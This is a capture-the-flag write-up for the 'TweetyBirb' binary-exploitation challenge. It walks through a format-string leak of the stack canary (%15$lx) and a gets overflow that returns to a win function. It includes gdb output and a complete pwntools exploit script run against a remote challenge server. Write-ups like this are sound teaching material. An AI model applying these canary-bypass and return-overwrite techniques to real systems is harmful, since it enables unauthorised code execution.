# TweetyBirb

## IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[72]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts(
    "What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb prot"
    "ectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?");
  gets(format, argv);
  printf(format);
  puts("\nhmmm interesting. What about water fowl?");
  gets(format, argv);
  return 0;
}

int win()
{
  return system("cat /home/user/flag.txt");
}
```

## Analysis
We immediately see the `printf(format)`, where `format` is a string we control.
So this is a printf format vulnerability challenge

Let's try to input a long string:
```
What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?
jnfadskjfksnadjnfadjskknjadsfnjadfsnjkfsdnjkdfsanjdafsnjldfasjknndsakjknfdkjadfnskjfnsdkjasnfdkjnfsdjnadsjnfnasdljnafdjsnladkjjadfnajfndsjafdnlnasfdlfd
jnfadskjfksnadjnfadjskknjadsfnjadfsnjkfsdnjkdfsanjdafsnjldfasjknndsakjknfdkjadfnskjfnsdkjasnfdkjnfsdjnadsjnfnasdljnafdjsnladkjjadfnajfndsjafdnlnasfdlfd
hmmm interesting. What about water fowl?
ahjfsfhjskahjfsdjahfdshfdsahjfadslhjkfadhjfdjhahfdjkhafdhkjfadhjklfadhfahdjfhadfadhshjkafdjhafjhfjkhfdkjahfdkajhjfadhsjkfadhkjafhdsjkahfsdjkhfdakjhfadjhafjlkhfljadkhafdjhafdjhdfasjkafhdsjkfadhsjkafdhjfkdahjklfadhlafjkdhjafdkhjkdfhfdjkahfadjhfdjkhfadjkhafdjhfadkjhafjkdhkjfhjfdahkjafhdjfadhjafhdkjfhakhjfada
*** stack smashing detected ***: terminated
[1]    1514 IOT instruction (core dumped)  ./tweetybirb
```

Stack canaries are activated, so we can't overwrite the return address (yet).
Using stack canaries is a compiler technique to mitigate buffer overflows.
When a fixed length buffer is present on the stack, the compiler automatically includes a random value
generated at program launch called "canary". When the buffer is overflowed, the canary is overwritten as well.
Before returning, the canary is checked against the original value, and if there is a mismatch a call to `___stack_chk_fail` is made,
which crashes the program. Here are the instructions of a basic function protected by canary:
```asm
push    rbp
mov     rbp, rsp
sub     rsp, 50h
mov     rax, fs:28h # !!!
[...]
```
Here we can see that a value from the FS segment is copied on the stack, which is the canary.
Let's see the end of the function:
```asm
xor     rdx, fs:28h
jz      short locret_401271
call    ___stack_chk_fail
locret_401271:
leave
retn
```
The value is checked against the value in the FS segment (by xor-ing them).
If they are not equal, the program jumps to `___stack_chk_fail` and crashes.

If we look at our binary, we have two `gets` calls, which means that the first time
we can leak the canary and the second time use it to bypass the check and overflow.

Let's open it in gdb and see where the canary is placed on the stack:
```
➜  tweety gdb tweetybirb 
GNU gdb (Ubuntu 11.1-0ubuntu2) 11.1
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from tweetybirb...
(No debugging symbols found in tweetybirb)
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004011f2 <+0>:	endbr64 
   0x00000000004011f6 <+4>:	push   rbp
   0x00000000004011f7 <+5>:	mov    rbp,rsp
   0x00000000004011fa <+8>:	sub    rsp,0x50
   0x00000000004011fe <+12>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000401207 <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040120b <+25>:	xor    eax,eax
   0x000000000040120d <+27>:	lea    rdi,[rip+0xe0c]        # 0x402020
   0x0000000000401214 <+34>:	call   0x401090 <puts@plt>
   0x0000000000401219 <+39>:	lea    rax,[rbp-0x50]
   0x000000000040121d <+43>:	mov    rdi,rax
   0x0000000000401220 <+46>:	mov    eax,0x0
   0x0000000000401225 <+51>:	call   0x4010d0 <gets@plt>
   0x000000000040122a <+56>:	lea    rax,[rbp-0x50]
   0x000000000040122e <+60>:	mov    rdi,rax
   0x0000000000401231 <+63>:	mov    eax,0x0
   0x0000000000401236 <+68>:	call   0x4010c0 <printf@plt>
   0x000000000040123b <+73>:	lea    rdi,[rip+0xeb6]        # 0x4020f8
   0x0000000000401242 <+80>:	call   0x401090 <puts@plt>
   0x0000000000401247 <+85>:	lea    rax,[rbp-0x50]
   0x000000000040124b <+89>:	mov    rdi,rax
   0x000000000040124e <+92>:	mov    eax,0x0
   0x0000000000401253 <+97>:	call   0x4010d0 <gets@plt>
   0x0000000000401258 <+102>:	mov    eax,0x0
   0x000000000040125d <+107>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401261 <+111>:	xor    rdx,QWORD PTR fs:0x28
   0x000000000040126a <+120>:	je     0x401271 <main+127>
   0x000000000040126c <+122>:	call   0x4010a0 <__stack_chk_fail@plt>
   0x0000000000401271 <+127>:	leave  
   0x0000000000401272 <+128>:	ret    
End of assembler dump.
gdb-peda$ break *main + 68
Breakpoint 1 at 0x401236
gdb-peda$ r
Starting program: /home/toma/tweety/tweetybirb 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?
AAAA

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7faaa80 --> 0xfbad208b 
RDX: 0x1 
RSI: 0x1 
RDI: 0x7fffffffe3b0 --> 0x41414141 ('AAAA')
RBP: 0x7fffffffe400 --> 0x1 
RSP: 0x7fffffffe3b0 --> 0x41414141 ('AAAA')
RIP: 0x401236 (<main+68>:	call   0x4010c0 <printf@plt>)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7fed1f0 (<strcmp+2240>:	pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x7fffffffe528 --> 0x7fffffffe774 ("/home/toma/tweety/tweetybirb")
R13: 0x4011f2 (<main>:	endbr64)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d0e00000000
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40122a <main+56>:	lea    rax,[rbp-0x50]
   0x40122e <main+60>:	mov    rdi,rax
   0x401231 <main+63>:	mov    eax,0x0
=> 0x401236 <main+68>:	call   0x4010c0 <printf@plt>
   0x40123b <main+73>:	lea    rdi,[rip+0xeb6]        # 0x4020f8
   0x401242 <main+80>:	call   0x401090 <puts@plt>
   0x401247 <main+85>:	lea    rax,[rbp-0x50]
   0x40124b <main+89>:	mov    rdi,rax
Guessed arguments:
arg[0]: 0x7fffffffe3b0 --> 0x41414141 ('AAAA')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3b0 --> 0x41414141 ('AAAA')
0008| 0x7fffffffe3b8 --> 0x0 
0016| 0x7fffffffe3c0 --> 0x0 
0024| 0x7fffffffe3c8 --> 0x0 
0032| 0x7fffffffe3d0 --> 0x0 
0040| 0x7fffffffe3d8 --> 0x7ffff7fab680 --> 0xfbad2087 
0048| 0x7fffffffe3e0 --> 0x0 
0056| 0x7fffffffe3e8 --> 0x7ffff7e24385 (<_IO_default_setbuf+69>:	cmp    eax,0xffffffff)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000401236 in main ()
gdb-peda$ context stack 10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3b0 --> 0x41414141 ('AAAA')
0008| 0x7fffffffe3b8 --> 0x0 
0016| 0x7fffffffe3c0 --> 0x0 
0024| 0x7fffffffe3c8 --> 0x0 
0032| 0x7fffffffe3d0 --> 0x0 
0040| 0x7fffffffe3d8 --> 0x7ffff7fab680 --> 0xfbad2087 
0048| 0x7fffffffe3e0 --> 0x0 
0056| 0x7fffffffe3e8 --> 0x7ffff7e24385 (<_IO_default_setbuf+69>:	cmp    eax,0xffffffff)
0064| 0x7fffffffe3f0 --> 0x0 
0072| 0x7fffffffe3f8 --> 0x6da8d4b151bde400 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

We are looking for a random qword value and a good candidate is at offset 72. 
If we run the program again, the value changes, so we found it. Let's leak it by using 
printf's argument index. If we write, for example, `%2$d` it will print the second argument
instead of the current one (it is 1-indexed). The canary is the 10th argument if we only 
consider the stack, but remember on 64-bit the first 6 arguments are passed into registers.
Those registers are different on each platform, but on Linux they are, in order,
RDI, RSI, RDX, RCX, R8, R9. The first argument is the format string (passed in RDI),
so if we want the 10th value on the stack we need to print the 15th argument. Let's try it:

```
➜  tweety ./tweetybirb 
What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?
%15$lx
4ac5aae193d7d300
hmmm interesting. What about water fowl?
^C
➜  tweety ./tweetybirb
What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?
%15$lx
d23072495f3bb00
hmmm interesting. What about water fowl?
^C
```

We have the canary, let's overflow. But let's checksec first.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

PIE is disabled, so we can just hardcode addresses from our binary.

```py
from pwn import *

context.log_level = 'debug'

elf = ELF("./tweetybirb")

r = gdb.debug("./tweetybirb")
r.recvline()
r.sendline(b"%15$lx")
canary = int(r.recvline().strip(), 16)
log.success(f"{canary=}")
r.recvline()
r.sendline(b"A" * 72 + p64(canary) + b"A" * 8 + p64(elf.sym['win']))
r.interactive()                                                                                                                                                                    
```

```
[----------------------------------registers-----------------------------------]
RAX: 0x7f48d1170ec0 --> 0x7ffe61ebc7f8 --> 0x7ffe61ebe7b2 ("LC_CTYPE=C.UTF-8")
RBX: 0x402008 ("cat /home/user/flag.txt")
RCX: 0x7ffe61ebc538 --> 0xc ('\x0c')
RDX: 0x0 
RSI: 0x7f48d112bcba --> 0x68732f6e69622f ('/bin/sh')
RDI: 0x7ffe61ebc334 --> 0x0 
RBP: 0x7ffe61ebc538 --> 0xc ('\x0c')
RSP: 0x7ffe61ebc328 --> 0x0 
RIP: 0x7f48d0fa47c3 (<do_system+355>:   movaps XMMWORD PTR [rsp+0x50],xmm0)
R8 : 0x7ffe61ebc378 --> 0x0 
R9 : 0x7ffe61ebc7f8 --> 0x7ffe61ebe7b2 ("LC_CTYPE=C.UTF-8")
R10: 0x8 
R11: 0x246 
R12: 0x7ffe61ebc398 --> 0x0 
R13: 0x4011f2 (<main>:  endbr64)
R14: 0x0 
R15: 0x7f48d11b3c40 --> 0x50d0e00000000
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f48d0fa47b4 <do_system+340>:        mov    QWORD PTR [rsp+0x60],rbx
   0x7f48d0fa47b9 <do_system+345>:  mov    r9,QWORD PTR [rax]
   0x7f48d0fa47bc <do_system+348>:  lea    rsi,[rip+0x1874f7]        # 0x7f48d112bcba
=> 0x7f48d0fa47c3 <do_system+355>:       movaps XMMWORD PTR [rsp+0x50],xmm0
   0x7f48d0fa47c8 <do_system+360>:    mov    QWORD PTR [rsp+0x68],0x0
   0x7f48d0fa47d1 <do_system+369>: call   0x7f48d1066000 <__GI___posix_spawn>
   0x7f48d0fa47d6 <do_system+374>:    mov    rdi,rbp
   0x7f48d0fa47d9 <do_system+377>:    mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0x7ffe61ebc328 --> 0x0 
0008| 0x7ffe61ebc330 --> 0xffffffff 
0016| 0x7ffe61ebc338 --> 0x0 
0024| 0x7ffe61ebc340 --> 0x0 
0032| 0x7ffe61ebc348 --> 0x0 
0040| 0x7ffe61ebc350 --> 0x0 
0048| 0x7ffe61ebc358 --> 0x0 
0056| 0x7ffe61ebc360 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f48d0fa47c3 in do_system (line=0x402008 "cat /home/user/flag.txt") at ../sysdeps/posix/system.c:148
```

We crash at `movaps` inside `system`. Newer libc implementations use `movaps` instructions,
which require 16-byte stack alignment. The x86-64 System V ABI guarantees 16-byte stack
alignment before a `call`, but this overflow doesn't respect that :) The fix is simple, 
before jumping to our function, jump to a `ret` instruction to pop another 8 bytes.
A `ret` can be found in `main` at offset 128.

Final script:
```py
from pwn import *

context.log_level = 'debug'

elf = ELF("./tweetybirb")

r = remote("143.198.184.186", 5002)
r.recvline()
r.sendline(b"%15$lx")
canary = int(r.recvline().strip(), 16)
log.success(f"{canary=}")
r.recvline()
r.sendline(b"A" * 72 + p64(canary) + b"A" * 8 + p64(elf.sym['main'] + 128) + p64(elf.sym['win']))
r.interactive()
```

```
➜  tweety python3 exploit.py
[*] '/home/toma/tweety/tweetybirb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 143.198.184.186 on port 5002: Done
[DEBUG] Received 0xd3 bytes:
    b"What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?\n"
[DEBUG] Sent 0x7 bytes:
    b'%15$lx\n'
[DEBUG] Received 0x3a bytes:
    b'1e7a45444f606100\n'
    b'hmmm interesting. What about water fowl?\n'
[+] canary=2196143927988347136
[DEBUG] Sent 0x69 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 61 60 4f  44 45 7a 1e  │AAAA│AAAA│·a`O│DEz·│
    00000050  41 41 41 41  41 41 41 41  72 12 40 00  00 00 00 00  │AAAA│AAAA│r·@·│····│
    00000060  d6 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000069
[*] Switching to interactive mode
[DEBUG] Received 0x54 bytes:
    b'kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}\n'
kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 143.198.184.186 port 5002
```

Final flag: `kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}`